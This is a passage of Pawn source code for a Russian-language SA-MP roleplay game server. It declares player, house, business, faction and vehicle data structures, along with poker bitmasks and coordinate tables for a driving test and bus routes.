	{401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
	{404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
	{492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
	{500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
	{518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
	{527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
	{534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
	{535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
	{536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
	{540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
	{542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
	{547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
	{550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
	{551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
	{558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
	{559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
	{560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
	{561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
	{562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
	{565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
	{567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
	{575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
	{600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};
new bool:EtherCalled[MAX_PLAYERS];
new bool:Ether[MAX_PLAYERS];
new bool:EtherLive[MAX_PLAYERS];
new bool:EtherCall[2];
new bool:EtherSms[2];
new oldpickup[MAX_PLAYERS];  // Запоминает ид старого пикапа
new Float:PickupX[MAX_PLAYERS],Float:PickupY[MAX_PLAYERS];  // Координаты старого пикапа
new PickupTimer[MAX_PLAYERS];  // Таймер пикапа
new IDVEH[MAX_PLAYERS];
new bool:UseEnter[MAX_PLAYERS];
new bool:PlayerCuffed[MAX_PLAYERS];
new bool:Phone[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new _Factory[MAX_PLAYERS];
new bool:TPC[MAX_PLAYERS];
new bool:PPC[MAX_PLAYERS];
new bool:times[MAX_PLAYERS];
new bool:VehRe[MAX_PLAYERS];
new InShop[MAX_PLAYERS];
new getReg_player[MAX_PLAYERS][4];
new getDuty_Reg[MAX_PLAYERS];
new rent_Vehicle[MAX_PLAYERS];
new Product_time[MAX_PLAYERS];
new PlayerLogged[MAX_PLAYERS] = 0;
new PlayerSpawned[MAX_PLAYERS] = 0;
new ReFuelTimer[MAX_PLAYERS];
new TimeLogged[MAX_PLAYERS];
new materials_Status[MAX_PLAYERS];
new materials_Time[MAX_PLAYERS];
new lictest_Time[MAX_PLAYERS];
new Text3D:materials_Label[MAX_PLAYERS];
enum AC_STRUCT_INFO
{
Float:LastOnFootPosition[3],
	checkmaptp,
	maptplastclick,
Float:maptp[3]
}
new acstruct[MAX_PLAYERS][AC_STRUCT_INFO];
new ProductTime[MAX_PLAYERS];
new FuelTime[MAX_PLAYERS];
new MatsFactTime[MAX_PLAYERS];
new bool:AdminLogged[MAX_PLAYERS];
new vorota,vorota2,vorota3;
new SendAdmin[MAX_PLAYERS];
new SendFamily[MAX_PLAYERS];
new BigEar[MAX_PLAYERS];
new TazerTime[MAX_PLAYERS];
new ChosenSkin[MAX_PLAYERS];
new PlayerLogTries[MAX_PLAYERS];
new STimer[MAX_PLAYERS];
new SSTimer[MAX_PLAYERS];
new PlayerStats[MAX_PLAYERS];
new NameStats[MAX_PLAYERS];
new ClothesRound[MAX_PLAYERS];
new PlayerHealP[MAX_PLAYERS];
new ClothesRun[MAX_PLAYERS];
new SelectCharID[MAX_PLAYERS];
new SelectCharPlace[MAX_PLAYERS];
new Float:VehicleHealNow[MAX_PLAYERS];
new Float:nowvehheal[MAX_PLAYERS];
new Float:PlayerArmour[MAX_PLAYERS];
new iPlayerAmmo[MAX_PLAYERS];
new iNewPlayerAmmo[MAX_PLAYERS];
new InShopSkin[MAX_PLAYERS];
//new Weapons[MAX_PLAYERS][47];
new HouseOffer[MAX_PLAYERS];
new HousePrice[MAX_PLAYERS];
new pPressed[MAX_PLAYERS];
new colors[MAX_PLAYERS][2];
new veh[MAX_PLAYERS];
new VehTest[MAX_PLAYERS];
new PlayerLastTick[MAX_PLAYERS];
new SelectCharRegID[MAX_PLAYERS];
new Text3D:BusText3D[MAX_PLAYERS];
new Text3D:TaxiText3D[MAX_PLAYERS];
new smokeobj[8];
new smokedclub[2] = 0,war = 0;
//--------------------КИЗИНО ------------
new Float:fishechkay[MAX_PLAYERS];
new Float:fishechkax[MAX_PLAYERS];
new NumberFishka[MAX_PLAYERS];
new Fishka[MAX_PLAYERS];
new bool:Upravakazino[MAX_PLAYERS];
new UseRoulette[MAX_PLAYERS];
new bool:RouletteStart[MAX_PLAYERS];
new bool:RouletteRunned[2];
new KrupieTime[2];
new bool:RoulRunned[2];
new RuletTip[MAX_PLAYERS];
new RouletteSumm[MAX_PLAYERS];
new CroupierN[2];
new RuletTimer;
new RuletTimer2;
new Kazkamera[MAX_PLAYERS];
new Float:Barabanchik = 0.00;
new Float:Barabanchik2 = 0.00;
new Braban[2];
new CasinoDuty[MAX_PLAYERS] = 0;
new Text3D:CasinoText[2];
//------------------------------
new Text:SiteText;
new Text:Box;
new Text:VehBox;
new Text:LBorder; //переменная л-границы  //
new Text:RBorder; //переменная п-границы  //
new Text:BBorder; //переменная н-границы  //
new Text:TBorder; //переменная в-границы  //
new	Text:Speed;
new Text:Fuell;
new	Text:Health;
new	Text:SpeedShow[MAX_PLAYERS];
new	Text:HealthShow[MAX_PLAYERS];
new Text:FuelShow[MAX_PLAYERS];
new Text:StatusShow[MAX_PLAYERS];
new Text:Speed2Show[MAX_PLAYERS];
new Text:EngineShow[MAX_PLAYERS];
new Text:PressA;
new Text:PressD;
new Text:PressH;
new Text:PressB;
new Text:PressC;
new Text:ButtonLeft;
new Text:ButtonSelect;
new Text:ButtonRight;
new Text:ButtonUp;
new Text:ButtonDown;
new Text:ButtonCancel;
new Text:VehNazv[MAX_PLAYERS];
new Text:VehCost[MAX_PLAYERS];
new Float:VectPx, Float:VectPy, Float:VectPz;
new pUsedVid;
enum pInfo {
	pID,
	pPassword[32],
	pIpPassword[32],
	pMail[64],
	pIP[16],
	pRegData[16],
	pLevel,
	pCash,
	pBank,
	pAdmin,
	pAdminDuty,
	pModel,
	pChar,
	pSex,
	pExp,
	pMuted,
	pWarn,
	pAutoSkill,
	pSkills[40],
	pAge,
	pLics[16],
	pLic[5],
	pGuns[40],
	pGun[13],
	pAmmos[160],
	pAmmo[13],
	pGunSkill[7],
	pLeader,
	pRank,
	pVoennik,
	pMember,
	pPick,
	pCheckTime,
	pNews,
	pPhones[16],
	pPhone[3],
	pText[3],
	pTexts[20],
	pJail,
	pJailTime,
	pWanted,
	pWantedTime,
	pWantedWho[MAX_PLAYER_NAME],
	pWantedReason[32],
Float:pHeal,
	pDrugs,
	pMats,
	pCrimes,
	pJob,
bool:pMarried,
	pWhoMarried[MAX_PLAYER_NAME],
	pReferal[MAX_PLAYER_NAME],
	pRefMoney,
	pPayCheck,
	pFish,
	pLottery,
bool:pVIP,
	pTime,
	pFightStyle,
	pCredits,
	pTotalCredits,
	pSkin1,
	pSkin2,
	pSkin3,
	pSpawnChange,
	pSatiety,
Float:pHealthS,
	pSportEXP,
	pOnline,
	pZakon,
	ProverkaIP,
	pHospital,
	pWatch,
	pCiggare,
	pSprunk,
	pMask,
	pPhoneBalance,
	pTruckSkill,
	pTaxiSkill,
	//////////////////////////////
	cModel,
	cClass,
	cFuel,
	cColor[2],
	cLock,
	cCost,
	cVehcom[64],
	cVehcoms[14],
	cPaintjob,
	/////////////////////////////
Float: pPos_x,
Float: pPos_y,
Float: pPos_z,
    pDostup,
	pSendername[MAX_PLAYER_NAME]
};
new PlayerInfo[MAX_PLAYERS][pInfo];
new PlayerRadio[MAX_PLAYERS];
#define MAXHOUSE 500
enum hInfo
{
	id,
Float:hEntrx,
Float:hEntry,
Float:hEntrz,
Float:hExitx,
Float:hExity,
Float:hExitz,
Float:hCarx,
Float:hCary,
Float:hCarz,
Float:hCarfa,
	hOwner[32],
	hDiscript[16],
	hPrice,
	hBuyPrice,
	hInt,
	hVirtual,
	hLock,
	hMIcon,
	hPickup,
Text3D:hPickupExit,
	hOplata,
	hHeal,
bool:hRob,
   /**/
   dID,
   dOwner[32],
   Float:dEntrx,
   Float:dEntry,
   Float:dEntrz,
   Float:dExitx,
   Float:dExity,
   Float:dExitz,
   dPrice,
   dPickup,
   Text3D:dPickupExit,
   dLock,
   dInt,
   dVirtual,
   dMIcon
};
new HouseInfo[MAXHOUSE][hInfo]; //
new lastveh;
//========
#define MAXATM 50
#define T_ATM   "atm"
enum atm
{
	ID,
Float:aX,
Float:aY,
Float:aZ,
Float:arX,
Float:arY,
Float:arZ,
};
new ATMInfo[MAXATM][atm],
TOTALATM;
new ATM[MAXATM];
new Text3D:LABELATM[MAXATM];
//========
#define MAX_BIZZ 200
enum bzInfo
{
	id,
Float:bEntrx,
Float:bEntry,
Float:bEntrz,
Float:bExitx,
Float:bExity,
Float:bExitz,
Float:bMenux,
Float:bMenuy,
Float:bMenuz,
	bOwner[MAX_PLAYER_NAME],
	bPrice,
	bBuyPrice,
	bMoney,
	bType,
	bLic,
	bInt,
	bVirtual,
	bLock,
	bEnter,
	bMIcon,
	bIcon,
	bPickup,
Text3D:bPickupExit,
	bName[MAX_PLAYER_NAME],
	bProduct,
	bTill,
	bMenu,
	bLockTime,
	bMafia,
	bZahvat
};
new BizzInfo[MAX_BIZZ][bzInfo];
new OnmZONE[1][20];
new ZoneOnBattlem[1];
new ZoneTimerm[1];
new allowedmfactions[] = {F_YAKUZA,F_LCN,F_RM};
new zons;
enum MzoneInfo
{
	mFrakVlad,
	mNapad,
}
new MZInfo[1][MzoneInfo];
new startwar = 0;
new	saveacc;
new	fuelcheck;
new	secupdate;
new badengine;
new	mzcheck;
new Seeds[MAX_VEHICLES];
new FarmWork = 0;
//========
#define MAX_FARM 2
enum farmInfo
{
	id,
	fOwner[MAX_PLAYER_NAME],
	fZam[MAX_PLAYER_NAME],
	fName[MAX_PLAYER_NAME],
	fPrice,
	fMoney,
	fSeeds,
	fFarmer1[MAX_PLAYER_NAME],
	fFarmer2[MAX_PLAYER_NAME],
	fFarmer3[MAX_PLAYER_NAME],
	fFarmer4[MAX_PLAYER_NAME],
	fPay,
	fLockTime,
	fMafia,
	fPickup,
	fDuty,
Text3D:fText,
};
new FarmInfo[farmInfo];
new vehiclerun[MAX_VEHICLES];
//========
new Text3D:LABELBIZZ[MAX_BIZZ];
new BizzPay[MAX_BIZZ]; //
#define MAX_CARS 500
#define VEHICLE_IN_FRACTION 30
#define MAX_VCARS 500
enum vInfo
{
	id,
	vModel,
	vColors[16],
	vColor[2],
Float:vX,
Float:vY,
Float:vZ,
Float:vFa,
	vInt,
	vWorld,
	vVehicle,
	vFr,
	vStatus,
	vCost
};
new VehInfo[MAX_VCARS][vInfo];
#define MAX_ADVERT 100
enum aInfo
{
	id,
	aText[128],
	aName[MAX_PLAYER_NAME],
	aPhone,
};
new AdvertInfo[MAX_ADVERT][2][aInfo];
#define MAX_PRODUCT 100
enum pinfo
{
	id,
	pName[MAX_PLAYER_NAME],
	pBizzid,
	pPrice,
	pTill,
bool:pStatus,
Text3D:pText3D
};
new ProductInfo[MAX_PRODUCT][pinfo];
#define MAX_FUEL 100
enum fuel_info
{
	id,
	pName[MAX_PLAYER_NAME],
	pBizzid,
	pPrice,
	pTill,
bool:pStatus,
Text3D:pText3D
};
new FuelInfo[MAX_FUEL][fuel_info];
enum
{
	HIGH_CARD = 0,
	ONE_PAIR = 1,
	TWO_PAIR = 2,
	THREE_OF_A_KIND = 3,
	STRAIGHT = 4,
	FLUSH = 5,
	FULL_HOUSE = 6,
	FOUR_OF_A_KIND = 7,
	STRAIGHT_FLUSH = 8,
	ROYAL_FLUSH = 9
};
new Bynary_Mask[] =
{
	1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000,
	1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000,
	1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000,
	1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000
	//		2	3	4	5	6	7	8	9	T	J	Q	K	A
};
#define TREFF 		0b1 //1 // "clubs"
#define KARO 		0b10 //2 // “diamonds”
#define KOR 		0b100 //4 // “hearts”
#define PIKK 		0b1000 //8 // “spades” or “shields”
new Color_Mask[] = {
	TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF, TREFF,	// 1 = 0b10
	KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO, KARO,		// 2 = 0b100
	KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR, KOR,						// 4 = 0b1000
	PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK, PIKK					// 8 = 0b10000
};
#define MAX_RANK 14
#define MAX_FRACTION 25
enum fInfo
{
	id,
	fName[32],
	fLeader[32],
	fAssistant[32],
	fHelpers[16],
	fHelper[5],
	fPayDays[128]
};
new FracInfo[MAX_FRACTION][fInfo];
new FracRank[MAX_FRACTION][14][25];
new FracPay[MAX_FRACTION][14];
new FracBank[MAX_FRACTION];
#define MAXENTERS 150
enum eInfo
{
	id,
Float:pX,
Float:pY,
Float:pZ,
	pM,
	pT,
	pI,
	pV,
Float:ptX,
Float:ptY,
Float:ptZ,
Float:ptFa,
	ptI,
	ptV,
	pName[32],
	pP
};
new EntersInfo[MAXENTERS][eInfo];

new MZSafeTime[3] = 0;
new FrakCDm[20];
enum reg_
{
	id,
	rlName[64],
	rType,
	rID,
	rMoney,
bool:rlStatus
};
new RegListInfo[10][4][reg_];
#define MAX_MBIZZ 5
enum maf_bizz
{
	id,
	ID,
	mFraction,
	mFractTime,
	mMatsPrice,
	mDrugsPrice,
	mMineral,
	mFuels[128],
	mFuel[5],
	mEntPrice,
	mBarPrice,
	mMetals[128],
}
new MafiaInfo[MAX_MBIZZ][maf_bizz];
#define MAX_GZONE 150
new OnZONE[MAX_GZONE][20];
new ZoneOnBattle[MAX_GZONE];
new ZoneTimer[MAX_GZONE];
new allowedfactions[] = { 7, 8, 9, 10, 11};
new GZSafeTime[MAX_GZONE];
enum GzoneInfo
{
	id,
Float:gCoords[4],
	gFrak,
	gNapad
}
new GZInfo[MAX_GZONE][GzoneInfo];
enum wInfo
{
	wSlot0,
	wSlot1,
	wSlot2,
	wSlot3,
	wSlot4,
	wSlot5,
	wSlot6,
	wSlot7,
	wSlot8,
	wSlot9,
	wSlot10,
	wSlot11,
	wSlot12,
}
new Weapon[MAX_PLAYERS][wInfo];
new GunCheckTime[MAX_PLAYERS];
//==============================================================================
new farm1car[2];
new fbicar[9];
new Float:LicTest[][6] = {
	{-2057.0349,-97.6983,34.9640,-2046.9010,-83.3292,34.9605},
	{-2046.9010,-83.3292,34.9605,-2064.7944,-67.8449,34.9680},
	{-2064.7944,-67.8449,34.9680,-2150.9500,-67.6467,34.9681},
	{-2150.9500,-67.6467,34.9681,-2233.7656,-68.0674,34.9681},
	{-2233.7656,-68.0674,34.9681,-2356.8203,-67.8888,34.9602},
	{-2356.8203,-67.8888,34.9602,-2374.2891,-83.8699,34.9680},
	{-2374.2891,-83.8699,34.9680,-2369.6785,-176.0927,34.9680},
	{-2369.6785,-176.0927,34.9680,-2275.1931,-192.4252,34.9680},
	{-2275.1931,-192.4252,34.9680,-2211.1313,-205.2264,35.1165},
	{-2211.1313,-205.2264,35.1165,-2208.9351,-290.7588,35.1164},
	{-2208.9351,-290.7588,35.1164,-2151.0479,-295.5232,35.2180},
	{-2151.0479,-295.5232,35.2180,-2009.5900,-292.5000,35.1165},
	{-2009.5900,-292.5000,35.1165,-2003.3285,-221.1794,35.5071},
	{-2003.3285,-221.1794,35.5071,-2004.3120,-85.6713,35.1253},
	{-2004.3120,-85.6713,35.1253,-2046.9167,-85.0139,34.9602},
	{-2046.9167,-85.0139,34.9602,-2079.7090,-94.0361,34.9601},
	{-2079.7090,-94.0361,34.9601,0.0,0.0,0.0}
};
//==============================================================================
new Float:BusCityLV[][] = {
	{2827.7122,1287.5374,10.4960, 2828.5979,1349.7295,10.4851},
	{2828.5979,1349.7295,10.4851, 2830.2490,1453.5867,10.4380},
	{2830.2490,1453.5867,10.4380, 2810.9434,1475.6493,10.4112},
	{2810.9434,1475.6493,10.4112, 2701.4114,1475.5786,13.2682},
	{2701.4114,1475.5786,13.2682, 2565.3254,1475.9387,10.5693},
	{2565.3254,1475.9387,10.5693, 2425.1672,1458.8348,10.3990},
	{2425.1672,1458.8348,10.3990, 2425.0232,1388.2212,10.3990},
	{2425.0232,1388.2212,10.3990, 2402.9827,1375.8306,10.3990}, ////////
	{2402.9827,1375.8306,10.3990, 2328.8313,1375.2654,10.4004},
	{2328.8313,1375.2654,10.4004, 2227.2595,1375.5146,10.5165},
	{2227.2595,1375.5146,10.5165, 2141.0669,1375.8522,10.3990},
	{2141.0669,1375.8522,10.3990, 2069.4941,1412.9413,10.3990}, ////////////
	{2069.4941,1412.9413,10.3990, 2069.3545,1555.6749,10.3985},
	{2069.3545,1555.6749,10.3985, 2074.2522,1691.2032,10.3990},
	{2074.2522,1691.2032,10.3990, 2083.3120,1731.3164,10.3990},
	{2083.3120,1731.3164,10.3990, 2137.4177,1838.8073,10.3990},
	{2137.4177,1838.8073,10.3990, 2149.4041,1949.7141,10.4067},
	{2149.4041,1949.7141,10.4067, 2154.9656,2006.7346,10.3990},
	{2154.9656,2006.7346,10.3990, 2149.2458,2047.8812,10.4067}, ///////////////////
	{2149.2458,2047.8812,10.4067, 2150.0891,2212.5806,10.3990},
	{2150.0891,2212.5806,10.3990, 2198.8176,2333.1411,10.3990},
	{2198.8176,2333.1411,10.3990, 2229.5842,2400.6025,10.3990},
	{2229.5842,2400.6025,10.3990, 2229.9485,2442.6384,10.4123},
	{2229.9485,2442.6384,10.4123, 2083.1667,2455.8521,10.399},
	{2083.1667,2455.8521,10.399, 2040.5520,2455.6323,10.3989}, /////////////
	{2040.5520,2455.6323,10.3989, 2025.2017,2409.2336,10.4048},
	{2025.2017,2409.2336,10.4048, 2010.3225,2395.3706,10.3990},
	{2010.3225,2395.3706,10.3990, 1939.4858,2395.5569,10.3990},
	{1939.4858,2395.5569,10.3990, 1925.0082,2362.3936,10.3990},
	{1925.0082,2362.3936,10.3990, 1924.9097,2314.9290,10.3990},
	{1924.9097,2314.9290,10.3990, 1925.1405,2190.0247,10.4048},
	{1925.1405,2190.0247,10.4048, 1924.7076,2116.0227,10.4982},
	{1924.7076,2116.0227,10.4982, 1924.9579,2054.0154,10.3990}, /////////////
	{1924.9579,2054.0154,10.3990, 1901.8656,2044.4187,10.3990},
	{1901.8656,2044.4187,10.3990, 1841.7213,2055.7852,10.5195},
	{1841.7213,2055.7852,10.5195, 1716.1443,2055.5381,10.4394},
	{1716.1443,2055.5381,10.4394, 1704.8038,2030.0398,10.4049},
	{1704.8038,2030.0398,10.4049, 1705.0792,1965.8193,10.3990},
	{1705.0792,1965.8193,10.3990, 1705.4348,1884.1003,10.3990},
	{1705.4348,1884.1003,10.3990, 1660.3359,1875.4397,10.3990},
	{1660.3359,1875.4397,10.3990, 1644.6434,1817.6515,10.4047},
	{1644.6434,1817.6515,10.4047, 1645.2438,1726.5471,10.3990}, /////////////////
	{1645.2438,1726.5471,10.3990, 1705.5009,1711.1305,10.3990},
	{1705.5009,1711.1305,10.3990, 1727.8558,1663.9143,9.7931},
	{1727.8558,1663.9143,9.7931, 1730.0469,1611.1600,9.5889},
	{1730.0469,1611.1600,9.5889, 1727.0743,1543.9349,10.3989},
	{1727.0743,1543.9349,10.3989, 1712.6594,1454.8257,10.4624},
	{1712.6594,1454.8257,10.4624, 1720.0021,1380.0167,10.2193},
	{1720.0021,1380.0167,10.2193, 1726.6637,1288.2371,10.3990},
	{1726.6637,1288.2371,10.3990, 1756.3873,1271.1761,11.7470},
	{1756.3873,1271.1761,11.7470, 1882.8234,1270.9567,10.3994},
	{1882.8234,1270.9567,10.3994, 2032.3241,1270.8514,10.3990},
	{2032.3241,1270.8514,10.3990, 2040.4423,1155.8553,10.3990}, ///////////////
	{2040.4423,1155.8553,10.3990, 2045.7813,1094.8022,10.3990},
	{2045.7813,1094.8022,10.3990, 2051.9490,980.1622,10.3478},
	{2051.9490,980.1622,10.3478, 2103.6660,970.9399,10.3455},
	{2103.6660,970.9399,10.3990, 2145.1384,925.0372,10.3989},
	{2145.1384,925.0372,10.3989, 2144.9375,721.4338,10.4355},
	{2144.9375,721.4338,10.4355, 2179.9919,710.7172,10.3990},
	{2179.9919,710.7172,10.3990, 2274.3362,711.1173,10.3990},
	{2274.3362,711.1173,10.3990, 2376.8376,710.9398,10.3990},
	{2376.8376,710.9398,10.3990, 2417.7654,710.7748,10.4140},
	{2417.7654,710.7748,10.4140, 2430.0789,737.1588,10.3990},
	{2430.0789,737.1588,10.3990, 2463.8088,770.4927,10.3990},
	{2463.8088,770.4927,10.3990, 2533.7329,770.6903,10.4068}, //////////////////
	{2533.7329,770.6903,10.4068, 2549.5715,813.9160,11.1068},
	{2549.5715,813.9160,11.1068, 2549.5967,941.5245,10.4065},
	{2549.5967,941.5245,10.4065, 2549.2029,1001.5764,10.3978},
	{2549.2029,1001.5764,10.3978, 2573.9358,1010.4851,10.4699},
	{2573.9358,1010.4851,10.4699, 2609.8220,1048.8676,10.3990},
	{2609.8220,1048.8676,10.3990, 2610.5010,1122.4563,10.3990},
	{2610.5010,1122.4563,10.3990, 2609.2266,1239.9553,10.3990}, ////////////////////////
	{2609.2266,1239.9553,10.3990, 2629.4099,1298.8424,10.3990},
	{2629.4099,1298.8424,10.3990, 2673.0471,1311.2069,11.5071},
	{2673.0471,1311.2069,11.5071, 2792.4287,1310.6711,10.4771},
	{2792.4287,1310.6711,10.4771, 2785.6804,1275.5779,10.4771},
	{2785.6804,1275.5779,10.4771, 2764.9609,1234.9835,10.4771},
	{2764.9609,1234.9835,10.4771, 2800.6440,1230.2970,10.4977},
	{2800.6440,1230.2970,10.4977, 2827.7122,1287.5374,10.4960},
	{2827.7122,1287.5374,10.4960, 0.0, 0.0, 0.0}
};
static const MaxPassengers[27] =
{
	0x10331113, 0x11311131, 0x11331313, 0x80133301,
	0x1381F110, 0x10311103, 0x10001F10, 0x11113311,
	0x13113311, 0x31101100, 0x30001301, 0x11031311,
	0x11111331, 0x10013111, 0x01131100, 0x11111110,
	0x11100031, 0x11130221, 0x33113311, 0x11111101,
	0x33101133, 0x101001F0, 0x03133111, 0xFF11113F,
	0x13330111, 0xFF131111, 0x0000FF3F
}; // HEX смещения макс. кол-ва пассажиров на основной транспорт
new trucker1lvl[2];
new trucker3lvl[2];
//==============================================================================
new Float:BusCitySF[][] = {
	{-1988.0446,140.1014,27.2661, -2003.4841,214.1351,27.2661},
	{-2003.4841,214.1351,27.2661, -2000.5131,313.4200,34.7426},
	{-2000.5131,313.4200,34.7426, -1998.5398,471.8105,34.7427},
	{-1998.5398,471.8105,34.7427, -2000.0660,589.2780,34.7443}, ///////////////
	{-2000.0660,589.2780,34.7443, -1983.1162,601.5040,34.7447},
	{-1983.1162,601.5040,34.7447, -1765.3795,600.4207,27.5781},
	{-1765.3795,600.4207,27.5781, -1708.5352,638.9060,24.4615},
	{-1708.5352,638.9060,24.4615, -1709.2012,713.6660,24.4673},
	{-1709.2012,713.6660,24.4673, -1686.2982,726.0994,21.9807},
	{-1686.2982,726.0994,21.9807, -1584.0829,725.0784,7.6853},
	{-1584.0829,725.0784,7.6853,-1539.4480,751.1326,6.7661}, ///////////////
	{-1539.4480,751.1326,6.7661, -1526.3699,902.7177,6.7661},
	{-1526.3699,902.7177,6.7661, -1566.6733,1008.7411,6.7661},
	{-1566.6733,1008.7411,6.7661, -1583.1990,1175.9945,6.7720},
	{-1583.1990,1175.9945,6.7720, -1657.7933,1278.0837,6.7703},
	{-1657.7933,1278.0837,6.7703, -1759.8112,1370.0012,6.7661},
	{-1759.8112,1370.0012,6.7661, -1893.3424,1340.7925,6.7662},
	{-1893.3424,1340.7925,6.7662, -2017.5878,1313.2760,6.7661},
	{-2017.5878,1313.2760,6.7661, -2124.4597,1335.1978,6.7739},
	{-2124.4597,1335.1978,6.7739, -2270.4126,1338.5504,6.7661},
	{-2270.4126,1338.5504,6.7661, -2457.7053,1353.1648,6.7688}, ///////////////////
	{-2457.7053,1353.1648,6.7688, -2459.7207,1222.8270,34.7824},
	{-2459.7207,1222.8270,34.7824, -2509.7961,1189.8923,39.7203},
	{-2509.7961,1189.8923,39.7203, -2647.5432,1209.3071,54.9540},
	{-2647.5432,1209.3071,54.9540, -2670.1223,1220.7137,55.1568},
	{-2670.1223,1220.7137,55.1568, -2701.2837,1216.6837,54.8801},
	{-2701.2837,1216.6837,54.8801, -2751.0327,1165.2881,51.2197},
	{-2751.0327,1165.2881,51.2197, -2732.4473,1097.7551,46.1041},
	{-2732.4473,1097.7551,46.1041, -2736.0510,1076.3564,46.6157},
